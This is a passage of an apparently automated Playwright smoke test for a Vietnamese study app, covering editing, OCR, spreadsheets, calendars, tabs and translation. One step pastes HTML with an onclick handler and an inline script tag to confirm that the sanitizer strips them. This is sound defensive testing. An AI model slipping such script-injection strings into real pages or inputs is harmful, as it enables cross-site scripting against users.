  await page.waitForSelector('.md-scroll img[src^="data:image/webp"]')
  check(await page.evaluate(() => document.querySelector('.md-scroll img[src^="data:image/webp"]').naturalWidth === 1600), 'the note shows the embedded image, shrunk from 2000 to 1600 px')

  // Settings → Library → "Save in assets/": the image goes next to the note.
  await page.click('.sidebar-head .icon-btn[title="Cài đặt"]')
  await settingsTab('Thư viện')
  await page.click('dialog.settings >> text=Lưu vào assets/')
  await page.click('dialog.settings >> text=Xong')
  await page.click('.doc-controls >> text=Raw')
  await page.waitForSelector('.raw-host .cm-content')
  await page.click('.raw-host .cm-content')
  await page.keyboard.press('Control+End')
  await pasteImage()
  await page.waitForFunction(() => document.querySelector('.raw-host .cm-content').textContent.includes('assets/'))
  await page.keyboard.press('Control+S')
  await page.waitForFunction(() => !document.querySelector('.raw-toolbar .dirty-dot'))
  check(read('Ảnh dán.md').includes('![](assets/Ảnh-dán-1.webp)') && existsSync(file('assets/Ảnh-dán-1.webp')), 'with "Save in assets/", the image is a file next to the note')
  await page.click('.raw-toolbar >> text=Đóng raw')
  await page.click('.sidebar-head .icon-btn[title="Cài đặt"]')
  await settingsTab('Thư viện')
  await page.click('dialog.settings >> text=Nhúng vào file')
  await page.click('dialog.settings >> text=Xong')

  step('32. Writing Markdown: live preview, shortcuts, lists, checkboxes')
  await menuOn('.root-row:has-text("library") .row.folder.root', 'Bài mới…')
  await nameDialog(['Viết thử'], 'md')
  await docPathIs('Viết thử.md')
  await page.waitForSelector('.md-editor .cm-content')
  check(true, 'a new Markdown note opens in the editor')
  await page.waitForFunction(() => document.querySelector('.md-editor .cm-content').textContent.includes('Viết thử'))
  await page.keyboard.type('Chữ ')
  await page.keyboard.press('Control+B')
  await page.keyboard.type('đậm')
  await page.keyboard.press('End')
  await page.keyboard.press('Enter')
  await page.keyboard.type('- [ ] việc')
  await page.keyboard.press('Enter') // continues the list: "- [ ] "
  await page.keyboard.type('việc 2')
  await page.waitForSelector('.md-editor .cm-md-strong')
  const editorLook = await page.evaluate(() => ({
    heading: !!document.querySelector('.md-editor .cm-line.cm-md-h1'),
    hiddenHash: !document.querySelector('.md-editor .cm-line.cm-md-h1').textContent.startsWith('#'),
    boxes: document.querySelectorAll('.md-editor .cm-md-task').length
  }))
  check(editorLook.heading && editorLook.hiddenHash && editorLook.boxes === 1, `live preview: big heading without "#", bold, a checkbox for the other line (${JSON.stringify(editorLook)})`)
  await page.click('.md-editor .cm-md-task')
  await page.keyboard.press('Control+S')
  await page.waitForFunction(() => !document.querySelector('.md-toolbar .dirty-dot'))
  check(read('Viết thử.md') === '# Viết thử\n\nChữ **đậm**\n- [x] việc\n- [ ] việc 2', `what is typed is exactly what is saved; Ctrl+B, Enter in a list, ticking a box (${JSON.stringify(read('Viết thử.md'))})`)
  // The "/" menu inserts blocks; tables, formulas and diagrams are drawn once the cursor leaves them.
  const slash = async (query) => {
    await page.keyboard.type(query)
    await page.waitForSelector('.cm-tooltip-autocomplete')
    await page.waitForTimeout(400) // as a person would: the list settles before Enter
    await page.keyboard.press('Enter')
  }
  await page.keyboard.press('Control+End')
  await page.keyboard.press('Enter')
  await page.keyboard.press('Enter')
  await slash('/bang')
  await page.keyboard.type('Giao thức')
  await page.keyboard.press('Control+End')
  await page.keyboard.type('\nCông thức $E = mc^2$ trong dòng.\n\n')
  await slash('/so do')
  await page.keyboard.press('Control+End')
  await page.keyboard.type('\nHết.')
  await page.waitForSelector('.md-editor .cm-md-table table')
  await page.waitForSelector('.md-editor .cm-md-math-inline .katex')
  await page.waitForSelector('.md-editor .cm-md-mermaid svg', { timeout: 20000 })
  await page.keyboard.press('Control+S')
  await page.waitForFunction(() => !document.querySelector('.md-toolbar .dirty-dot'))
  const withBlocks = read('Viết thử.md')
  check(
    withBlocks.includes('| Giao thức | Cột 2 |\n| --- | --- |') && withBlocks.includes('$E = mc^2$') && withBlocks.includes('```mermaid\nflowchart LR'),
    '"/" inserts a table and a diagram; the table, formula and diagram are drawn in the editor, the file keeps plain Markdown'
  )
  await page.click('.md-toolbar >> text=Xong')
  await page.waitForSelector('.md-scroll strong')
  check((await page.locator('.md-scroll strong:has-text("đậm")').count()) === 1, 'after "Done" the note is shown as before')

  step('33. Writing HTML: bold, Enter for a new paragraph, only that part of the file changes')
  await openDoc('Ghi chép HTML')
  await docPathIs('backend/Ghi chép HTML.html')
  const noteBefore = read('backend/Ghi chép HTML.html')
  await page.click('.doc-controls >> text=Sửa chữ')
  await page.waitForSelector('.html-format')
  const noteFrame = await editPage()
  await noteFrame.waitForSelector('p[data-sd-block]')
  await painted(noteFrame)
  await noteFrame.click('p[data-sd-block]')
  await page.keyboard.press('Control+A')
  await page.keyboard.type('Một câu ')
  await page.keyboard.press('Control+B')
  await page.keyboard.type('đậm')
  await page.keyboard.press('Control+B')
  await page.keyboard.press('Enter')
  await page.keyboard.type('Đoạn mới')
  // Ctrl+F while editing; Esc closes the find bar only, the edit goes on.
  await page.keyboard.press('Control+F')
  await page.waitForSelector('.find-bar input')
  await page.fill('.find-bar input', 'doan moi')
  await page.waitForFunction(() => /^\d+\/\d+$/.test(document.querySelector('.find-count')?.textContent ?? ''))
  const editFind = await page.textContent('.find-count')
  await page.press('.find-bar input', 'Escape')
  await page.waitForSelector('.find-bar', { state: 'detached' })
  check(editFind === '1/1' && (await page.locator('.edit-bar').count()) === 1, `Ctrl+F works while editing an HTML page (${editFind}); Esc closes only the find bar`)
  await page.click('.edit-bar >> text=Lưu (Ctrl+S)')
  await page.waitForSelector('.edit-bar', { state: 'detached', timeout: 10000 })
  const noteAfter = read('backend/Ghi chép HTML.html')
  const noteBody = (h) => h.slice(h.indexOf('<body>'))
  check(
    /<p>Một câu( |&nbsp;)<b>đậm<\/b><\/p>\n<p>Đoạn mới<\/p>/.test(noteAfter) && noteAfter.slice(0, noteAfter.indexOf('<body>')) === noteBefore.slice(0, noteBefore.indexOf('<body>')),
    `HTML: bold kept, Enter made a new paragraph, the rest of the file is unchanged (${JSON.stringify(noteBody(noteAfter).slice(0, 160))})`
  )

  step('34. HTML: a new paragraph becomes a heading, then a list; Enter on an empty item ends the list')
  await page.click('.doc-controls >> text=Sửa chữ')
  await page.waitForSelector('.html-format')
  const fmtFrame = await editPage()
  await fmtFrame.waitForSelector('p[data-sd-block] >> text=Đoạn mới')
  await painted(fmtFrame)
  await fmtFrame.click('p[data-sd-block] >> text=Đoạn mới')
  await page.keyboard.press('End')
  await page.keyboard.press('Enter')
  await page.keyboard.type('Mục lớn')
  await page.selectOption('.html-format .block-type', 'h2')
  await fmtFrame.waitForSelector('h2[data-sd-new]')
  // The menu hands the keyboard back to the page a moment later; a person never types that fast.
  await fmtFrame.waitForFunction(() => document.hasFocus())
  await page.waitForTimeout(50)
  await page.keyboard.press('Enter')
  await page.selectOption('.html-format .block-type', 'ul')
  await fmtFrame.waitForSelector('ul[data-sd-new-list] li')
  await page.keyboard.type('Ý một')
  await page.keyboard.press('Enter')
  await page.keyboard.type('Ý hai')
  await page.keyboard.press('Enter')
  await page.keyboard.press('Enter')
  await page.keyboard.type('Kết thúc')
  const pageBeforeSave = await fmtFrame.evaluate(() => document.body.innerHTML.replace(/<style[\s\S]*$/, ''))
  await page.click('.edit-bar >> text=Lưu (Ctrl+S)')
  await page.waitForSelector('.edit-bar', { state: 'detached', timeout: 10000 })
  const withList = read('backend/Ghi chép HTML.html')
  check(
    withList.includes('<p>Đoạn mới</p>\n<h2>Mục lớn</h2>\n<ul>\n  <li>Ý một</li>\n  <li>Ý hai</li>\n</ul>\n<p>Kết thúc</p>'),
    `new paragraphs can become a heading or a list, written after their block (${JSON.stringify(withList.slice(withList.indexOf('<p>Đoạn'), withList.indexOf('</body>')))}${withList.includes('<h2>Mục lớn') ? '' : ` page: ${pageBeforeSave}`})`
  )

  step('34b. HTML: a new item in a list already in the file becomes a paragraph; dragging an item reorders the list')
  await page.click('.doc-controls >> text=Sửa chữ')
  await page.waitForSelector('.html-format')
  const dragFrame = await editPage()
  await dragFrame.waitForSelector('li[data-sd-block] >> text=Ý hai')
  await painted(dragFrame)
  await dragFrame.click('li[data-sd-block] >> text=Ý hai')
  await page.keyboard.press('End')
  await page.keyboard.press('Enter')
  await page.selectOption('.html-format .block-type', 'p')
  await dragFrame.waitForSelector('ul + p[data-sd-new]')
  await page.keyboard.type('Sau danh sách')
  const dragBox = await page.locator('iframe.html-frame').boundingBox()
  const itemTwo = await dragFrame.locator('li[data-sd-block] >> text=Ý hai').boundingBox()
  const itemOne = await dragFrame.locator('li[data-sd-block] >> text=Ý một').boundingBox()
  await page.mouse.move(itemTwo.x + 20, itemTwo.y + itemTwo.height / 2)
  await page.waitForTimeout(150)
  const grip = await dragFrame.evaluate(() => {
    const r = document.querySelector('.sd-handle').getBoundingClientRect()
    return { x: r.left + r.width / 2, y: r.top + r.height / 2 }
  })
  await page.mouse.move(dragBox.x + grip.x, dragBox.y + grip.y)
  await page.mouse.down()
  for (let i = 1; i <= 8; i++) await page.mouse.move(dragBox.x + grip.x, dragBox.y + grip.y - ((itemTwo.y - itemOne.y + 4) * i) / 8)
  await page.mouse.up()
  await page.click('.edit-bar >> text=Lưu (Ctrl+S)')
  await page.waitForSelector('.edit-bar', { state: 'detached', timeout: 10000 })
  const dragged = read('backend/Ghi chép HTML.html')
  check(
    dragged.includes('<ul>\n  <li>Ý hai</li>\n  <li>Ý một</li>\n</ul>\n<p>Sau danh sách</p>\n<p>Kết thúc</p>'),
    `a new item at the end of an existing list becomes a paragraph after it; a dragged item moves in the file (${JSON.stringify(dragged.slice(dragged.indexOf('<ul>'), dragged.indexOf('</body>')))})`
  )

  step('34c. HTML: a table is inserted, filled with Tab, gets a column; later a row of it is deleted')
  const openEditFrame = async () => {
    await page.click('.doc-controls >> text=Sửa chữ')
    await page.waitForSelector('.html-format')
    return editPage()
  }
  let tableFrame = await openEditFrame()
  await tableFrame.waitForSelector('p[data-sd-block] >> text=Kết thúc')
  await painted(tableFrame)
  await tableFrame.click('p[data-sd-block] >> text=Kết thúc')
  await page.click('.html-format >> text=Bảng')
  await tableFrame.waitForSelector('table[data-sd-new-table]')
  await page.keyboard.type('A')
  await page.keyboard.press('Tab')
  await page.keyboard.type('B')
  await page.keyboard.press('Tab')
  await page.keyboard.type('1')
  await tableFrame.waitForSelector('.sd-table-tools', { state: 'visible' })
  await tableFrame.click('.sd-table-tools [data-action="col-add"]')
  await page.keyboard.type('x')
  await page.click('.edit-bar >> text=Lưu (Ctrl+S)')
  await page.waitForSelector('.edit-bar', { state: 'detached', timeout: 10000 })
  const withTable = read('backend/Ghi chép HTML.html')
  check(
    withTable.includes(
      '<p>Kết thúc</p>\n<table>\n  <thead>\n    <tr><th>A</th><th></th><th>B</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>1</td><td>x</td><td></td></tr>\n    <tr><td></td><td></td><td></td></tr>\n  </tbody>\n</table>'
    ),
    `"Bảng" inserts a table after the block; Tab moves between cells; "+ Cột" adds a column (${JSON.stringify(withTable.slice(withTable.indexOf('<p>Kết thúc'), withTable.indexOf('</body>')))})`
  )
  tableFrame = await openEditFrame()
  await tableFrame.waitForSelector('td[data-sd-block] >> text=x')
  await tableFrame.click('td[data-sd-block] >> text=x')
  await tableFrame.click('.sd-table-tools [data-action="row-del"]')
  await page.click('.edit-bar >> text=Lưu (Ctrl+S)')
  await page.waitForSelector('.edit-bar', { state: 'detached', timeout: 10000 })
  const rowGone = read('backend/Ghi chép HTML.html')
  check(
    rowGone.includes('  <tbody>\n    <tr><td></td><td></td><td></td></tr>\n  </tbody>') && !rowGone.includes('<td>x</td>'),
    `"− Hàng" deletes a row of a table in the file, with its line (${JSON.stringify(rowGone.slice(rowGone.indexOf('<table>'), rowGone.indexOf('</body>')))})`
  )

  step('35. Empty folders show in the tree; notes move to another workspace folder with their tags')
  await menuOn('.root-row:has-text("library") .row.folder.root', 'Thư mục mới…')
  await nameDialog(['Trống'])
  await page.waitForSelector(`.doc-list .row.folder[data-folder-id="${libKey}/Trống"]`)
  check(existsSync(file('Trống')) && (await page.locator(`.doc-list .row.folder[data-folder-id="${libKey}/Trống"]`).count()) === 1, 'a new folder may be empty, and shows in the tree')
  const writtenId = await page.evaluate(async () => (await window.api.getLibrary()).docs.find((d) => d.rel === 'Viết thử.md').path)
  await page.evaluate((id) => window.api.updateMeta(id, { tags: ['chuyen'] }), writtenId)
  await page.waitForTimeout(300)
  await page.evaluate(({ id, target }) => {
    const dt = new DataTransfer()
    dt.setData('application/x-studydocs-doc', id)
    document.querySelector(`.root-row .row.folder.root[data-folder-id="${target}"]`).dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }))
  }, { id: writtenId, target: keyOf(extra) })
  for (let i = 0; i < 50 && !existsSync(path.join(extra, 'Viết thử.md')); i++) await page.waitForTimeout(100)
  await page.waitForTimeout(500)
  const extraTags = JSON.parse(readFileSync(path.join(dataDir(extra), 'meta.json'), 'utf8')).docs['Viết thử.md']?.tags
  check(existsSync(path.join(extra, 'Viết thử.md')) && !existsSync(file('Viết thử.md')) && extraTags?.includes('chuyen') && !metaOfLib()['Viết thử.md'], 'a note dragged to another workspace folder moves there, its tags move to that folder\'s data')

  step('36. Closing with unsaved edits asks in the app\'s own dialog')
  await openDoc('React useEffect — khi nào chạy?')
  await docPathIs(REACT)
  await page.click('.doc-controls >> text=Raw')
  await page.waitForSelector('.raw-host .cm-content')
  await page.click('.raw-host .cm-content')
  await page.keyboard.press('Control+End')
  await page.keyboard.type(' (dở)')
  await page.waitForTimeout(300)
  await setAnswer('dismiss') // "Ở lại"
  const askedBeforeClose = await page.evaluate(() => window.__smokeAsked)
  await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().find((w) => w.isVisible())?.close())
  await page.waitForFunction((n) => window.__smokeAsked > n, askedBeforeClose, { timeout: 5000 })
  await page.waitForTimeout(300)
  check((await page.evaluate(() => document.title.length >= 0)) && (await page.locator('.raw-toolbar .dirty-dot').count()) === 1, 'closing with unsaved edits asks in the app; "Stay" keeps the window and the edit')
  await setAnswer('accept')
  await page.click('.raw-toolbar >> text=Đóng raw')
  await page.waitForSelector('.raw-toolbar', { state: 'detached' })
  await setAnswer('dismiss')

  step('37. PDF: the character maps and JPEG 2000 decoder of pdf.js ship with the app')
  const pdfjsFiles = await page.evaluate(async () => {
    const get = async (p) => (await fetch(new URL(p, document.baseURI))).status
    return [await get('pdfjs/cmaps/UniJIS-UCS2-H.bcmap'), await get('pdfjs/wasm/openjpeg.wasm'), await get('pdfjs/standard_fonts/FoxitSerif.pfb')]
  })
  check(pdfjsFiles.join(',') === '200,200,200', `pdf.js finds its CJK character maps, standard fonts and JPEG 2000 decoder (${pdfjsFiles.join(', ')})`)

  step('38. Calendar: a calendar followed by its link, and a reminder')
  await page.click('.sidebar-head .icon-btn[title="Lịch học"]')
  await page.waitForSelector('.calendar-host.fc')
  await page.click('.calendar-toolbar >> text=Lịch theo dõi…')
  await page.waitForSelector('dialog.subs-dialog[open]')
  await page.fill('dialog.subs-dialog input[aria-label="Tên lịch"]', 'Trường')
  await page.fill('dialog.subs-dialog input[aria-label="Link lịch (iCal)"]', `${WEB}/lich.ics`)
  check(await page.isVisible('dialog.subs-dialog .subs-warning'), 'an http:// link gets a warning (not encrypted)')
  await page.click('dialog.subs-dialog .subs-buttons .btn.primary')
  await page.waitForSelector('dialog.subs-dialog .subs-list li >> text=1 sự kiện')
  // A link to something huge: refused while downloading, not read whole into memory.
  await page.fill('dialog.subs-dialog input[aria-label="Tên lịch"]', 'To quá')
  await page.fill('dialog.subs-dialog input[aria-label="Link lịch (iCal)"]', `${WEB}/huge.ics`)
  await page.click('dialog.subs-dialog .subs-buttons .btn.primary')
  await page.waitForSelector('dialog.subs-dialog .subs-list li:has-text("To quá") .subs-error', { timeout: 30000 })
  check((await page.textContent('dialog.subs-dialog .subs-list li:has-text("To quá") .subs-error')).includes('Lịch quá lớn'), 'a calendar over 20 MB is refused while it downloads')
  await page.click('dialog.subs-dialog .subs-list li:has-text("To quá") >> text=Bỏ theo dõi')
  await page.waitForSelector('dialog.subs-dialog .subs-list li:has-text("To quá")', { state: 'detached' })
  await page.click('dialog.subs-dialog header .icon-btn')
  const subbed = await page.evaluate(() => window.api.calendarRange('2030-03-06', '2030-03-07'))
  const toan = subbed.find((o) => o.summary === 'Toán rời rạc')
  check(!!toan && toan.readOnly && toan.source === 'Trường' && !readFileSync(path.join(userData, 'data', 'calendar.ics'), 'utf8').includes('Toán rời rạc'), 'a calendar followed by its link shows its events, read-only, without copying them')
  await page.click('.calendar-toolbar .icon-btn[title="Trước"]')
  await page.click(`.fc-event[data-key="${toan.uid}|${toan.rid}"]`)
  await page.waitForSelector('.event-panel h2 >> text=Toán rời rạc')
  check((await page.locator('.event-panel .event-actions').count()) === 0 && (await page.textContent('.event-panel .event-meta')).includes('Trường'), 'its classes have no Edit/Delete; the panel says where they come from')
  // A reminder 15 minutes before: a standard VALARM.
  await page.click('.calendar-toolbar >> text=+ Sự kiện')
  await page.waitForSelector('dialog.event-dialog[open]')
  await page.fill('dialog.event-dialog input[name="summary"]', 'Ôn thi')
  await page.fill('input[aria-label="Ngày bắt đầu"]', '2030-03-07')
  await page.fill('input[aria-label="Giờ bắt đầu"]', '1930')
  await page.fill('input[aria-label="Giờ kết thúc"]', '21h')
  await page.selectOption('select[aria-label="Nhắc trước"]', '15')
  await page.click('dialog.event-dialog footer .btn.primary')
  await page.waitForSelector('dialog.event-dialog', { state: 'detached' })
  const ics2 = readFileSync(path.join(userData, 'data', 'calendar.ics'), 'utf8')
  check(ics2.includes('SUMMARY:Ôn thi') && ics2.includes('DTSTART:20300307T193000') && ics2.includes('DTEND:20300307T210000') && ics2.includes('TRIGGER:-PT15M'), 'time typed as "1930" / "21h" (24-hour); a reminder is saved as a standard VALARM')

  step('39. OCR: a scanned PDF gets text (offline), then Ctrl+F and search find it')
  await page.click('dialog.subs-dialog header .icon-btn').catch(() => {})
  const scanPng = await page.evaluate(() => {
    const c = document.createElement('canvas')
    c.width = 1240
    c.height = 1754
    const g = c.getContext('2d')
    g.fillStyle = '#fff'
    g.fillRect(0, 0, c.width, c.height)
    g.fillStyle = '#111'
    g.font = '48px Times New Roman'
    ;['Giao thức TCP bảo đảm thứ tự', 'các gói tin và gửi lại khi mất.'].forEach((l, i) => g.fillText(l, 120, 200 + i * 90))
    return c.toDataURL('image/png')
  })
  const scanPdf = file('Bản scan.pdf')
  await app.evaluate(async ({ BrowserWindow }, { png, out }) => {
    const w = new BrowserWindow({ show: false, webPreferences: { sandbox: true } })
    await w.loadURL('data:text/html,' + encodeURIComponent(`<html><body style="margin:0"><img src="${png}" style="width:100%"></body></html>`))
    process.getBuiltinModule('fs').writeFileSync(out, await w.webContents.printToPDF({ pageSize: 'A4', margins: { marginType: 'none' } }))
    w.destroy()
  }, { png: scanPng, out: scanPdf })
  await page.waitForSelector('.doc-list .row.doc >> text=Bản scan', { timeout: 15000 })
  await openDoc('Bản scan')
  await page.waitForSelector('.pdf-ocr-bar >> text=Nhận dạng chữ (OCR)', { timeout: 15000 })
  await page.click('.pdf-ocr-bar >> text=Nhận dạng chữ (OCR)')
  await page.waitForSelector('.pdf-ocr-bar >> text=Nhận dạng lại', { timeout: 120000 })
  await page.waitForSelector('.ocr-layer span', { timeout: 10000 })
  const ocrText = await page.evaluate(() => document.querySelector('.ocr-layer').textContent)
  check(/TCP/.test(ocrText) && /gói tin/.test(ocrText), `OCR reads the scanned page, Vietnamese accents included ("${ocrText}")`)
  await page.keyboard.press('Control+F')
  await page.fill('.find-bar input', 'gui lai')
  await page.waitForFunction(() => /^\d+\/\d+$/.test(document.querySelector('.find-count')?.textContent ?? ''))
  const ocrFind = await page.textContent('.find-count')
  await page.press('.find-bar input', 'Escape')
  let ocrSearch = []
  for (let i = 0; i < 40 && !ocrSearch.length; i++) {
    ocrSearch = await page.evaluate(() => window.api.search('bao dam thu tu'))
    if (!ocrSearch.length) await page.waitForTimeout(250)
  }
  check(ocrFind === '1/1' && ocrSearch.some((h) => h.path.endsWith('Bản scan.pdf')), `its text is found with Ctrl+F (${ocrFind}) and by search (${ocrSearch.length})`)
  check(readdirSync(path.join(userData, 'ocr')).length === 1, 'OCR text is kept in the app\'s data; the PDF is not changed')

  step('40. Spreadsheets: a CSV and an XLSX open as grids; edits are saved in place')
  const csvSrc = '﻿Họ tên;Điểm\r\n"Nguyễn An";8,5\r\nTrần Bình;7\r\n'
  writeFileSync(file('Bảng điểm.csv'), csvSrc)
  const book = new JSZip()
  book.file('[Content_Types].xml', '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
  book.file('xl/workbook.xml', '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Chi tiêu" sheetId="1" r:id="rId1"/></sheets></workbook>')
  book.file('xl/_rels/workbook.xml.rels', '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="x" Target="worksheets/sheet1.xml"/></Relationships>')
  book.file('xl/sharedStrings.xml', '<?xml version="1.0"?><sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><si><t>Khoản</t></si><si><t>Tiền</t></si><si><t>Sách giáo khoa</t></si></sst>')
  book.file('xl/worksheets/sheet1.xml', '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1" t="s"><v>0</v></c><c r="B1" t="s"><v>1</v></c></row><row r="2"><c r="A2" t="s"><v>2</v></c><c r="B2"><v>50000</v></c></row><row r="3"><c r="B3"><f>B2</f><v>50000</v></c></row></sheetData></worksheet>')
  writeFileSync(file('Chi tiêu.xlsx'), await book.generateAsync({ type: 'nodebuffer' }))
  await page.waitForSelector('.doc-list .row.doc >> text=Bảng điểm', { timeout: 10000 })
  check((await page.textContent('.doc-list .row.doc:has-text("Bảng điểm") .kind')) === 'CSV', 'a CSV file is listed as CSV')
  await openDoc('Bảng điểm')
  await page.waitForSelector('.sheet-grid td[data-cell="1:0"]')
  check((await page.textContent('.sheet-grid td[data-cell="1:0"]')) === 'Nguyễn An', 'the CSV opens as a grid (quotes and ; read)')
  await page.click('.sheet-grid td[data-cell="2:1"]')
  await page.keyboard.press('F2')
  await page.keyboard.press('Control+A')
  await page.keyboard.type('7,5')
  await page.keyboard.press('Enter')
  await page.click('.sheet-tools >> text=+ Hàng')
  await page.keyboard.type('Lê Chi')
  await page.keyboard.press('Tab')
  await page.keyboard.type('9')
  await page.keyboard.press('Control+s')
  await page.waitForSelector('.sheet-dirty', { state: 'detached', timeout: 5000 })
  check(read('Bảng điểm.csv') === '﻿Họ tên;Điểm\r\n"Nguyễn An";8,5\r\nTrần Bình;7,5\r\nLê Chi;9\r\n', `only the edited and new rows are written; the rest, the BOM and CRLF are kept (${JSON.stringify(read('Bảng điểm.csv'))})`)
  await openDoc('Chi tiêu')
  await page.waitForSelector('.sheet-grid td[data-cell="1:0"]')
  check(
    (await page.textContent('.sheet-grid td[data-cell="1:0"]')) === 'Sách giáo khoa' && (await page.getAttribute('.sheet-grid td[data-cell="2:1"]', 'class')).includes('k-formula'),
    'the XLSX opens as a grid; a formula cell shows its saved result'
  )
  await page.dblclick('.sheet-grid td[data-cell="2:1"]')
  check((await page.locator('.sheet-input').count()) === 0, 'a formula cell is not edited')
  await page.click('.sheet-grid td[data-cell="1:1"]')
  await page.keyboard.type('65000')
  await page.keyboard.press('Enter')
  await page.click('.sheet-bar >> text=Lưu (Ctrl+S)')
  await page.waitForSelector('.sheet-dirty', { state: 'detached', timeout: 5000 })
  const savedBook = await JSZip.loadAsync(readFileSync(file('Chi tiêu.xlsx')))
  const sheetXml = await savedBook.file('xl/worksheets/sheet1.xml').async('string')
  check(
    sheetXml.includes('<c r="B2"><v>65000</v></c>') && sheetXml.includes('<c r="B3"><f>B2</f><v>50000</v></c>') && (await savedBook.file('xl/workbook.xml').async('string')).includes('fullCalcOnLoad="1"'),
    'only the edited cell changes in the XLSX; its formulas are recalculated when Excel opens it'
  )

  step('41. HTML: pasting copied content keeps bold, italic and links, and its paragraphs and headings')
  writeFileSync(file('Dán thử.html'), '<!doctype html>\n<html>\n<head><meta charset="utf-8"><title>Dán thử</title></head>\n<body>\n<p>Đầu</p>\n</body>\n</html>\n')
  await page.waitForSelector('.doc-list .row.doc >> text=Dán thử', { timeout: 10000 })
  await openDoc('Dán thử')
  await page.click('.doc-controls >> text=Sửa chữ')
  await page.waitForSelector('.html-format')
  const pasteFrame = await editPage()
  await pasteFrame.waitForSelector('p[data-sd-block]')
  await painted(pasteFrame)
  await pasteFrame.click('p[data-sd-block]')
  await page.keyboard.press('End')
  await pasteFrame.evaluate(() => {
    const copied =
      '<meta charset="utf-8"><p>: một <span style="font-weight: 700;">đậm</span> và <em>nghiêng</em>, <a href="https://example.com/x" onclick="alert(1)">link</a></p>' +
      '<h2 style="color: red">Mục mới</h2><p><b style="font-weight:normal;" id="docs-internal-guid-1">không đậm</b><script>alert(2)</script></p>'
    const dt = new DataTransfer()
    dt.setData('text/html', copied)
    dt.setData('text/plain', 'plain')
    document.querySelector('p[data-sd-block]').dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true }))
  })
  await page.click('.edit-bar >> text=Lưu (Ctrl+S)')
  await editBarGone()
  const pasted = read('Dán thử.html')
  check(
    pasted.includes('<p>Đầu: một <b>đậm</b> và <i>nghiêng</i>, <a href="https://example.com/x">link</a></p>\n<h2>Mục mới</h2>\n<p>không đậm</p>') &&
      !/onclick|script|color|docs-internal/.test(pasted),
    `formatting and blocks are kept; handlers, scripts, colours are not (${JSON.stringify(pasted.slice(pasted.indexOf('<body>'), pasted.indexOf('</body>')))})`
  )

  step('42. Tabs: Ctrl+click opens a new tab; Ctrl+Tab switches, Ctrl+W closes; a plain click reuses the tab')
  await openDoc('React useEffect — khi nào chạy?')
  await docPathIs(REACT)
  const tabCount = () => page.locator('.doc-tab').count()
  // Real key presses (they go through the main process, like typing; Playwright's keyboard does not).
  const realKey = (keyCode, modifiers) =>
    app.evaluate(({ BrowserWindow }, [k, m]) => {
      const wc = BrowserWindow.getAllWindows().find((w) => w.isVisible()).webContents
      wc.sendInputEvent({ type: 'keyDown', keyCode: k, modifiers: m })
      wc.sendInputEvent({ type: 'keyUp', keyCode: k, modifiers: m })
    }, [keyCode, modifiers])
  const before = await tabCount()
  await page.click('.doc-list .row.doc >> text=Lộ trình Backend', { modifiers: ['Control'] })
  await docPathIs(ROADMAP)
  check((await tabCount()) === before + 1 && (await page.textContent('.doc-tab.active .doc-tab-name')) === 'Lộ trình Backend', 'Ctrl+click opens the document in a new tab next to the open one')
  await realKey('Tab', ['control'])
  await docPathIs(REACT)
  check((await page.textContent('.doc-tab.active .doc-tab-name')).startsWith('React useEffect'), 'Ctrl+Tab goes to the other tab')
  await openDoc('Event Sourcing — Bài học để chép vào vở')
  await docPathIs(ES)
  check((await tabCount()) === before + 1, 'a plain click shows the document in the open tab (no new tab)')
  await realKey('W', ['control'])
  await docPathIs(ROADMAP)
  check((await tabCount()) === before && (await page.locator('.doc-tab-name', { hasText: 'Event Sourcing' }).count()) === 0, 'Ctrl+W closes the tab and shows the one next to it (the window stays open)')
  check(JSON.parse(await page.evaluate(() => localStorage.getItem('tabs:workspace'))).length === before, 'the tabs are kept for the next start')

  step('43. Selected text is translated; "Highlight + ghi chú" keeps the translation as the highlight\'s note')
  // No network here: Google Translate is replaced by a stand-in.
  await app.evaluate(({ ipcMain }) => {
    ipcMain.removeHandler('translate')
    ipcMain.handle('translate', (_e, text, to) => ({ text: `[${to}] ${text}`, from: 'en', to, cut: false }))
  })
  writeFileSync(file('Dịch thử.md'), '# Dịch thử\n\nA cache stores copies of data.\n')
  await page.waitForSelector('.doc-list .row.doc >> text=Dịch thử', { timeout: 10000 })
  await openDoc('Dịch thử')
  await page.waitForSelector('.markdown p')
  await page.waitForTimeout(600)
  const para = await page.locator('.markdown p').first().boundingBox()
  await page.mouse.move(para.x + 1, para.y + para.height / 2)
  await page.mouse.down()
  await page.mouse.move(para.x + para.width - 2, para.y + para.height / 2, { steps: 6 })
  await page.mouse.up()
  await page.click('.hl-translate-btn')
  await page.waitForSelector('.translate-popover .translate-text:not(.loading)')
  check((await page.textContent('.translate-text')) === '[vi] A cache stores copies of data.', `the selected text is translated into Vietnamese (${await page.textContent('.translate-text')})`)
  await page.click('.translate-actions >> text=Highlight + ghi chú')
  await page.waitForTimeout(500)
  const translated = await page.evaluate(async () => {
    const lib = await window.api.getLibrary()
    const id = lib.docs.find((d) => d.rel === 'Dịch thử.md').path
    return (lib.notes[id] ?? [])[0]
  })
  check(translated?.quote === 'A cache stores copies of data.' && translated?.note === '[vi] A cache stores copies of data.', 'the text is highlighted with the translation as its note')
  // Refused once (as Google does when a network sent many requests), then fine: "Thử lại".
  await app.evaluate(({ ipcMain }) => {
    let first = true
    ipcMain.removeHandler('translate')
    ipcMain.handle('translate', (_e, text, to) => {
      if (first) {
        first = false
        throw new Error('Google Dịch đang tạm chặn')
      }
      return { text: `[${to}] ${text}`, from: 'en', to, cut: false }
    })
  })
  writeFileSync(file('Dịch lại.md'), '# Dịch lại\n\nThe lecture starts at nine.\n')
  await page.waitForSelector('.doc-list .row.doc >> text=Dịch lại', { timeout: 10000 })
  await openDoc('Dịch lại')
  await page.waitForSelector('.markdown p')
  await page.waitForTimeout(600)
  const para2 = await page.locator('.markdown p').first().boundingBox()
